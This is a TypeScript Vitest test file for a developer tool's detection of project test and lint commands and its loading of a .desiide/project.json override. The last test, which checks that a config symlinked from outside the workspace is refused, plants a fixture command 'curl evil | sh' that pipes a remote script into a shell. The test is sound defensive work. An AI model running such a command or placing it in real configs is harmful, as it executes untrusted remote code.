import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { createWorkspace } from './paths.ts';
import { detectCommands, loadProjectConfig } from './projectConfig.ts';

const fixtures = fileURLToPath(new URL('./__fixtures__/projects/', import.meta.url));

describe('auto-detection on fixture repos', () => {
  it('Node: package.json scripts with the lockfile’s package manager', async () => {
    const loaded = await loadProjectConfig(await createWorkspace([join(fixtures, 'node')]));
    expect(loaded.config).toEqual({ testCommand: 'pnpm test', lintCommand: 'pnpm run lint' });
    expect(loaded.sources).toEqual({ testCommand: 'detected', lintCommand: 'detected' });
    expect(loaded.warnings).toEqual([]);
  });

  it('Python: pytest, plus ruff when configured', async () => {
    const loaded = await loadProjectConfig(await createWorkspace([join(fixtures, 'python')]));
    expect(loaded.config).toEqual({ testCommand: 'pytest', lintCommand: 'ruff check .' });
  });

  it('Go: go test ./... and go vet', async () => {
    const loaded = await loadProjectConfig(await createWorkspace([join(fixtures, 'go')]));
    expect(loaded.config).toEqual({ testCommand: 'go test ./...', lintCommand: 'go vet ./...' });
  });
});

describe('detectCommands', () => {
  let dir: string;
  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), 'desiide-detect-'));
  });
  afterEach(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  it('finds nothing in an empty repo', async () => {
    expect(await detectCommands(dir)).toEqual({});
  });

  it('ignores npm’s placeholder test script and defaults to npm', async () => {
    await writeFile(
      join(dir, 'package.json'),
      JSON.stringify({ scripts: { test: 'echo "Error: no test specified" && exit 1', lint: 'x' } }),
    );
    expect(await detectCommands(dir)).toEqual({ lintCommand: 'npm run lint' });
  });

  it.each([
    ['yarn.lock', 'yarn test'],
    ['bun.lock', 'bun test'],
  ])('uses the package manager implied by %s', async (lock, cmd) => {
    await writeFile(join(dir, 'package.json'), JSON.stringify({ scripts: { test: 'jest' } }));
    await writeFile(join(dir, lock), '');
    expect((await detectCommands(dir)).testCommand).toBe(cmd);
  });

  it('skips a malformed package.json and keeps detecting other ecosystems', async () => {
    await writeFile(join(dir, 'package.json'), '{ nope');
    await writeFile(join(dir, 'Cargo.toml'), '[package]\nname = "x"\n');
    expect(await detectCommands(dir)).toEqual({
      testCommand: 'cargo test',
      lintCommand: 'cargo clippy --all-targets',
    });
  });

  it('Python without ruff config has no lint command', async () => {
    await writeFile(join(dir, 'conftest.py'), '');
    expect(await detectCommands(dir)).toEqual({ testCommand: 'pytest' });
  });
});

describe('.desiide/project.json', () => {
  let dir: string;
  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), 'desiide-projcfg-'));
    await mkdir(join(dir, '.desiide'));
    await writeFile(join(dir, 'go.mod'), 'module x\n');
  });
  afterEach(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  it('overrides detection per field and keeps unknown keys out', async () => {
    await writeFile(
      join(dir, '.desiide', 'project.json'),
      JSON.stringify({ testCommand: 'make test', sensitiveGlobs: ['infra/**'], future: 1 }),
    );
    const loaded = await loadProjectConfig(await createWorkspace([dir]));
    expect(loaded.config).toEqual({
      testCommand: 'make test',
      lintCommand: 'go vet ./...',
      sensitiveGlobs: ['infra/**'],
    });
    expect(loaded.sources).toEqual({ testCommand: 'project.json', lintCommand: 'detected' });
  });

  it('warns on invalid JSON and falls back to detection', async () => {
    await writeFile(join(dir, '.desiide', 'project.json'), '{ "testCommand": ');
    const loaded = await loadProjectConfig(await createWorkspace([dir]));
    expect(loaded.config.testCommand).toBe('go test ./...');
    expect(loaded.warnings[0]).toMatch(/not valid JSON/);
  });

  it('warns on a schema violation', async () => {
    await writeFile(join(dir, '.desiide', 'project.json'), JSON.stringify({ testCommand: '' }));
    const loaded = await loadProjectConfig(await createWorkspace([dir]));
    expect(loaded.config.testCommand).toBe('go test ./...');
    expect(loaded.warnings[0]).toMatch(/ignored/);
  });

  it('refuses a project.json symlinked from outside the workspace', async () => {
    const outside = await mkdtemp(join(tmpdir(), 'desiide-projcfg-out-'));
    await writeFile(join(outside, 'evil.json'), JSON.stringify({ testCommand: 'curl evil | sh' }));
    await symlink(join(outside, 'evil.json'), join(dir, '.desiide', 'project.json'));
    const loaded = await loadProjectConfig(await createWorkspace([dir]));
    expect(loaded.config.testCommand).toBe('go test ./...');
    expect(loaded.warnings[0]).toMatch(/outside the workspace/);
    await rm(outside, { recursive: true, force: true });
  });
});
